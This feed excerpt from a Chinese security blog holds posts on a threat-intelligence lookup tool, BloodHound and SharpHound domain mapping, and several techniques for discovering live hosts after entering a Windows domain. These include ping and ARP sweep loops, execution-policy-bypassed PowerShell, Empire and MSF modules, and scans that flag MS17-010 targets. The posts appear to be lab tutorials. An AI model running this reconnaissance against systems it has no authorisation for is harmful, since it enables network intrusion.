    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>tig <code>Threat Intelligence Gathering</code> 威胁情报收集，旨在提高蓝队拿到攻击 IP 后对其进行威胁情报信息收集的效率，目前已集成微步、IP 域名反查、Fofa 信息收集、ICP 备案查询、IP 存活检测五个模块，现已支持以下信息的查询：</p><ul><li>✅ 微步标签</li><li>✅ IP 域名反查</li><li>✅ ICP 备案查询</li><li>✅ IP 存活检测</li><li>✅ 开放端口查询</li><li>……</li></ul><p>后续将集成更多模块，如有好的建议或遇到 Bug 欢迎与我反馈，我的微信号：teamssix_com</p><p>工具地址：<a href="https://github.com/wgpsec/tig">https://github.com/wgpsec/tig</a>，或点击查看原文链接进行打开</p><p>如果感觉工具还行，欢迎各位师傅赏个 star</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>需要 python3 环境支持</p><pre><code>pip3 install -r requirements.txtpython3 tig.py</code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>工具命令如下：</p><pre><code>-h, --help  查看帮助信息-c CONFIG   指定配置文件，默认 ./config.ini-f FILE     IP 文本，一行一个-i IP       目标 IP-p PROXY    指定代理，比如：http://127.0.0.1:1080 或者 socks5://127.0.0.1:1080</code></pre><p>在开始使用工具之前，需要对配置文件进行配置，默认配置文件如下：</p><pre><code>[Threat Intelligence]# 微步威胁情报查询，查看 api 地址：https://x.threatbook.cn/nodev4/vb4/myAPI（每天 50 次的免费额度）ThreatBook_enable = trueThreatBook_api = &#39;&#39;[IP Passive Information]# IP 反查，调用 http://api.hackertarget.com/reverseiplookup/ 的 api，每个 IP 限制每天 100 次免费查询IP_reverse_enable = true# ICP 备案信息查询，调用 https://api.vvhan.com/api/icp 的 api，如果目标 IP 没有反查到域名，该项即使开启也不会有输出ICP_beian_enable = true# Fofa ip 信息查询，查看 api 地址：https://fofa.so/user/users/detail（付费，普通会员每次100条，高级会员每次10000条）Fofa_enable = trueFofa_email = &#39;&#39;Fofa_api = &#39;&#39;[IP Active Information]# 利用 ping 命令对 IP 进行存活检测IP_survive_enable = true</code></pre><p>在配置文件里添加自己的微步 API 和 Fofa API 才可使用相关模块，添加 API 后，就可以正常使用相关模块了。</p><p>例如这里获取某个 IP 的信息，直接使用 -i 命令即可，如果想使用代理可以使用 -p 命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-03-15_13-03-47.png"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>如果在工具使用的过程中发现存在 bug 等问题，欢迎与我反馈，我的微信号：teamssix_com，同时也欢迎关注我的个人微信公众号：TeamsSix</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;tig &lt;code&gt;Threat Intelligence Gathering&lt;/code&gt; 威胁情</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
    <category term="蓝队" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="威胁情报" scheme="https://www.teamssix.com/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】5、BloodHound 的使用</title>
    <link href="https://www.teamssix.com/year/210226-190853.html"/>
    <id>https://www.teamssix.com/year/210226-190853.html</id>
    <published>2021-02-26T11:08:53.000Z</published>
    <updated>2021-02-26T10:10:32.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p><p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p><p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p><pre><code>URL：neo4j://localhost:7687用户名(默认)：neo4j密码(默认)：neo4j</code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p><pre><code>C:\Users\daniel10&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:36 on 2021/2/25---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain TEAMSSIX.COM using path CN=Schema,CN=Configuration,DC=teamssix,DC=com[+] Cache File Found! Loaded 1332 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 24 MB RAMStatus: 673 objects finished (+673 134.6)/s -- Using 43 MB RAMEnumeration finished in 00:00:05.3136324Compressing data to .\20210225223622_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:36 on 2021/2/25! Happy Graphing!</code></pre><p>如果使用 ps1 脚本收集，命令为：</p><pre><code>powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</code></pre><p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p><blockquote><p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p></blockquote><p>在 BloodHound 右上角有三个板块：</p><p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p><p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p><p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p><pre><code>1、查询所有域管理员2、寻找到域管理员的最短路径3、查找具有DCSync权限的主体4、具有外部域组成员资格的用户5、具有外部域名组成员资格的组6、映射域信任7、到无约束委托系统的最短路径8、到达Kerberoastable用户的最短路径9、从Kerberoastable用户到域管理员的最短路径10、拥有的主体的最短路径11、从拥有的主体到域管理员的最短路径12、到高价值目标的最短路径13、查找域用户是本地管理员的计算机14、查找域用户可以读取密码的计算机15、从域用户到高价值目标的最短路径16、找到从域用户到高价值目标的所有路径17、找到域用户可以RDP的工作站18、找到域用户可以RDP的服务器19、查找域用户组的危险权限20、找到高价值群体中能够支持kerberoable的成员21、列出所有kerberoable用户22、查找具有大多数特权的Kerberoastable用户23、查找到非域控制器的域管理登录24、查找不支持操作系统的计算机25、查找AS-REP Roastable用户(DontReqPreAuth)</code></pre><p>比如这里查询到域管理员的最短路径</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-25_14-00-42.png"></p><blockquote><p>路径由粗到细表示xx对xx有权限或关系</p></blockquote><p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a></p><p><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】域内主机存活探测的一些方法总结</title>
    <link href="https://www.teamssix.com/year/210224-210909.html"/>
    <id>https://www.teamssix.com/year/210224-210909.html</id>
    <published>2021-02-24T13:09:09.000Z</published>
    <updated>2021-02-24T03:12:53.640Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。</p><h2 id="1、ping"><a href="#1、ping" class="headerlink" title="1、ping"></a>1、ping</h2><p>使用 ping 进行检测的优点是不容易触发检测规则，缺点是速度较慢，如果目标开启了禁止 ping 的策略，那这个方法就 gg 了。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre><code>for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i &quot;ttl=&quot;</code></pre><pre><code>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i &quot;ttl=&quot;来自 192.168.7.7 的回复: 字节=32 时间&lt;1ms TTL=128来自 192.168.7.107 的回复: 字节=32 时间=1ms TTL=64来自 192.168.7.110 的回复: 字节=32 时间&lt;1ms TTL=128</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code></pre><pre><code>teamssix@localhost:~#  for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done192.168.7.7192.168.7.107192.168.7.110</code></pre><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><pre><code>strSubNet = &quot;192.168.7.&quot;  Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;)  Set objTS = objfso.CreateTextFile(&quot;C:\Result.txt&quot;)   For i = 1 To 254  strComputer = strSubNet &amp; i  blnResult = Ping(strComputer)  If blnResult = True Then  objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot;  End If  Next   objTS.Close  WScript.Echo &quot;All Ping Scan , All Done ! :) &quot;    Function Ping(strComputer)  Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#39;&quot; &amp; strComputer &amp; &quot;&#39;&quot;) For Each objItem In colItems  Select case objItem.StatusCode  Case 0  Ping = True  Case Else  Ping = False  End select  Exit For  Next  End Function</code></pre><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><h3 id="TSPingSweep"><a href="#TSPingSweep" class="headerlink" title="TSPingSweep"></a>TSPingSweep</h3><p>PowerShell TSPingSweep 扫描脚本下载地址：</p><p><a href="https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1">https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1</a></p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_21-02-52.png"></p><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;IPAddress     HostName             Ports---------     --------             -----192.168.7.7   dc.teamssix.com      &#123;445, 135&#125;192.168.7.107 DANIEL7.teamssix.com &#123;445, 135&#125;192.168.7.110 daniel10.teamssix... &#123;445, 135&#125;</code></pre><h3 id="ARPScan"><a href="#ARPScan" class="headerlink" title="ARPScan"></a>ARPScan</h3><p>PowerShell ARPScan 扫描脚本下载地址：<a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0/24&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0/24&quot;MAC               Address---               -------16:7D:DA:D7:8F:64 192.168.7.100:0C:29:1D:82:CF 192.168.7.700:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:DC:01:0D 192.168.7.255</code></pre><h2 id="3、arp-scan"><a href="#3、arp-scan" class="headerlink" title="3、arp-scan"></a>3、arp-scan</h2><p>arp-scan 使用 ARP 协议进行探测。arp-scan Windows 下载地址：<a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p><pre><code>C:\Users\daniel10&gt;arp-scan.exe -t 192.168.7.0/24Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500</code></pre><h2 id="4、arp-ping"><a href="#4、arp-ping" class="headerlink" title="4、arp-ping"></a>4、arp-ping</h2><p>Arp-ping 基于 arp 协议，它可以 “ping” 受防火墙保护的主机，下载地址：<a href="https://www.elifulkerson.com/projects/arp-ping.php">https://www.elifulkerson.com/projects/arp-ping.php</a></p><p>由于 arp-ping 只能一次 ping 一台主机，但在测试过程中肯定不能一台一台的 ping ，所以这里参考上面的 ping 脚本写了一个 arp-ping 循环 ping 主机的脚本。</p><pre><code>for /l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find /i &quot;Reply&quot;</code></pre><pre><code>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find /i &quot;Reply&quot;Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 2.233msReply that 00:0C:29:A9:62:98 is 192.168.7.107 in 16.857msReply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.205msReply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.200ms</code></pre><h2 id="5、Empire"><a href="#5、Empire" class="headerlink" title="5、Empire"></a>5、Empire</h2><p>Empire 内置了arpscan 模块，该模块可利用 arp 协议对内网主机进行探测。将目标主机上线 Empire 后，使用 powershell/situational_awareness/network/arpscan 模块，设置扫描范围即可，具体如下：</p><pre><code>(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- APDGSW9X ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         3648   5/0.0    2021-02-23 20:43:27(Empire: agents) &gt; usemodule powershell/situational_awareness/network/arpscan(Empire: powershell/situational_awareness/network/arpscan) &gt; set Agent APDGSW9X(Empire: powershell/situational_awareness/network/arpscan) &gt; set CIDR 192.168.7.0/24(Empire: powershell/situational_awareness/network/arpscan) &gt; executeMAC               Address      ---               -------      16:7D:DA:D7:8F:64 192.168.7.1  00:0C:29:1D:82:CF 192.168.7.7  00:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:1D:82:CF 192.168.7.255</code></pre><h2 id="6、nbtscan"><a href="#6、nbtscan" class="headerlink" title="6、nbtscan"></a>6、nbtscan</h2><p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p><p>nbtscan 下载地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><pre><code>C:\Users\daniel10&gt;nbtscan.exe 192.168.7.0/24192.168.7.1     \DP192.168.7.7     TEAMSSIX\DC                     SHARING DC192.168.7.107   TEAMSSIX\DANIEL7                SHARING*timeout (normal end of scan)</code></pre><h2 id="7、unicornscan"><a href="#7、unicornscan" class="headerlink" title="7、unicornscan"></a>7、unicornscan</h2><p>unicornscan 使用 UDP 协议，在 kali 下可以直接 apt-get 进行安装，这个使用起来感觉有点慢。</p><pre><code>teamssix@localhost:~# unicornscan -mU 192.168.7.7UDP open              domain[   53]        from 192.168.7.7  ttl 127teamssix@localhost:~# for k in $( seq 1 255);do unicornscan -mU 192.168.7.$k|grep &quot;open&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $5&#125;&#39;; done192.168.7.1192.168.7.7192.168.7.107</code></pre><h2 id="8、scanline"><a href="#8、scanline" class="headerlink" title="8、scanline"></a>8、scanline</h2><p>McAfee 出品，推荐 win 下使用（管理员执行），scanline 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>C:\Users\daniel10&gt;scanline.exe -n 192.168.7.0-255ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 256 IPs started at Tue Feb 23 22:07:40 2021-------------------------------------------------------------------------------192.168.7.7Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.107Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.110Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------Scan finished at Tue Feb 23 22:07:49 20213 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs</code></pre><h2 id="9、telnet"><a href="#9、telnet" class="headerlink" title="9、telnet"></a>9、telnet</h2><p>通过 telnet 探测 445 端口或者其他端口判断主机存活。</p><pre><code>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</code></pre><h2 id="10、tcping"><a href="#10、tcping" class="headerlink" title="10、tcping"></a>10、tcping</h2><p>tcping.exe 是一个命令行程序，其操作类似于“ping”，但它通过 TCP 工作，下载地址：<a href="https://elifulkerson.com/projects/tcping.php">https://elifulkerson.com/projects/tcping.php</a></p><pre><code>C:\Users\daniel10&gt;tcping.exe -n 1 192.168.7.7 445Probing 192.168.7.7:445/tcp - Port is open - time=1.719msPing statistics for 192.168.7.7:445     1 probes sent.     1 successful, 0 failed.  (0.00% fail)Approximate trip times in milli-seconds:     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms</code></pre><h2 id="11、cping"><a href="#11、cping" class="headerlink" title="11、cping"></a>11、cping</h2><p>k8 团队出品，下载地址：<a href="https://www.lanzous.com/i3837ne#Window">https://www.lanzous.com/i3837ne#Window</a></p><p>下载解压后可以看到很多个 exe 文件，其分别代表了.net 编译版本，编译版本对应系统如下：</p><pre><code>XP/2003(已淘汰,用户少,使用的大部分也会装.net,因为好多app需要连驱动都要.net,具体看安装版本一般2.0)Vista       2.0(基本上也没多少用户)Win7/2008   2.0 3.0 3.5Win8/2012   4.0Win8.1      4.0 4.5Win10/2016  4.0 4.6 (4.5未测应该也行)</code></pre><pre><code>C:\Users\daniel10&gt;cping40.exe scan osver 192.168.7.1 192.168.7.255Scan OS version192.168.7.1---192.168.7.255Segment: 192.168.7.0=============================================IP              MAC               HostName        OSver192.168.7.7     00-0C-29-1D-82-CF dc.teamssix.com [Win 2008 R2 Datacenter 7601 SP 1]192.168.7.110   00-0C-29-DC-01-0D daniel10.teamssix.com []192.168.7.107   00-0C-29-A9-62-98 daniel7.teamssix.com [Win 7 Professional 7601 SP 1]=============================================Count:3</code></pre><h2 id="12、fscan"><a href="#12、fscan" class="headerlink" title="12、fscan"></a>12、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，工具下载地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.1-255 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is alive(icmp) Target &#39;192.168.7.110&#39; is alive(icmp) Target &#39;192.168.7.107&#39; is aliveicmp alive hosts len is: 3192.168.7.110:445 open192.168.7.7:445 open192.168.7.107:445 open192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable192.168.7.110  (Windows 10 Pro 18363)[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)[+] 192.168.7.107       MS17-010        (Windows 7 Professional 7601 Service Pack 1)scan end</code></pre><h2 id="13、Nmap"><a href="#13、Nmap" class="headerlink" title="13、Nmap"></a>13、Nmap</h2><p>提到扫描自然不能少了 nmap，nmap 支持多种协议的扫描，具体如下：</p><pre><code>ARP 扫描：            nmap -PR -sn 192.168.7.0/24ICMP 扫描：        nmap ‐sP ‐PI 192.168.7.0/24 ‐T4ICMP 扫描：        nmap ‐sn ‐PE ‐T4 192.168.7.0/24SNMP 扫描：        nmap -sU --script snmp-brute 192.168.7.0/24 -T4UDP 扫描：            nmap -sU -T5 -sV --max-retries 1 192.168.7.7 -p 500NetBIOS 扫描：    nmap --script nbstat.nse -sU -p137 192.168.7.0/24 -T4SMB 扫描：            nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.7.0/24……</code></pre><h2 id="14、MSF"><a href="#14、MSF" class="headerlink" title="14、MSF"></a>14、MSF</h2><p>除了 Nmap 之外，万能的 MSF 自然也不能少，MSF 能够进行主机存活探测的模块如下：</p><pre><code>auxiliary/scanner/discovery/udp_probeauxiliary/scanner/discovery/udp_sweepauxiliary/scanner/discovery/arp_sweepauxiliary/scanner/netbios/nbnameauxiliary/scanner/snmp/snmp_enumauxiliary/scanner/smb/smb_version……</code></pre><p>除了上述工具外，还有 netdiscover、snscan 等工具可用于内网主机存活探测，在这其中有些工具因为使用起来感觉探测的不是很理想等原因，在此就不记录了，如果读者感兴趣的话可自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p><p><a href="https://micro8.gitbook.io/micro8/contents-1">https://micro8.gitbook.io/micro8/contents-1</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13722474.html">https://www.cnblogs.com/xiaozi/p/13722474.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11908260.html">https://www.cnblogs.com/-mo-/p/11908260.html</a></p><p><a href="https://blog.csdn.net/weixin_42918771/article/details/108798729">https://blog.csdn.net/weixin_42918771/article/details/108798729</a></p><p><a href="https://blog.csdn.net/qq_45366449/article/details/113650656">https://blog.csdn.net/qq_45366449/article/details/113650656</a></p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。&lt;/p&gt;
&lt;h2 id=&quot;1、ping&quot;&gt;&lt;a href=&quot;#1、ping&quot; </summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】4、域内信息收集</title>
    <link href="https://www.teamssix.com/year/210224-210341.html"/>
    <id>https://www.teamssix.com/year/210224-210341.html</id>
    <published>2021-02-24T13:03:41.000Z</published>
    <updated>2021-02-24T03:12:15.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p><pre><code>ipconfig /all</code></pre><pre><code>C:\Users\daniel10&gt; ipconfig /allWindows IP 配置   主 DNS 后缀 . . . . . . . . . .  : teamssix.com   DNS 后缀搜索列表  . . . . . . . . : teamssix.com以太网适配器 Ethernet0:   IPv4 地址 . . . . . . . . . . .. : 192.168.7.110   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.7.1   DNS 服务器  . . . . . . . . . . . : 192.168.7.7</code></pre><p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p><pre><code>nslookup teamssix.com</code></pre><pre><code>C:\Users\daniel10&gt; nslookup teamssix.com服务器:  UnKnownAddress:  192.168.7.7名称:    teamssix.comAddress:  192.168.7.7</code></pre><h3 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h3><pre><code>systeminfo</code></pre><pre><code>C:\Users\daniel10&gt; systeminfo | findstr 域:域: teamssix.com</code></pre><h3 id="当前登录域与域用户"><a href="#当前登录域与域用户" class="headerlink" title="当前登录域与域用户"></a>当前登录域与域用户</h3><pre><code>net config workstation</code></pre><pre><code>C:\Users\daniel10&gt; net config workstation | findstr 域工作站域                    TEAMSSIX工作站域 DNS 名称            teamssix.com登录域                      TEAMSSIX</code></pre><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre><code>net time /domain</code></pre><pre><code>C:\Users\daniel10&gt; net time /domain\\dc.teamssix.com 的当前时间是 2021/2/13 20:49:56命令成功完成。</code></pre><h2 id="2、收集域内基础信息"><a href="#2、收集域内基础信息" class="headerlink" 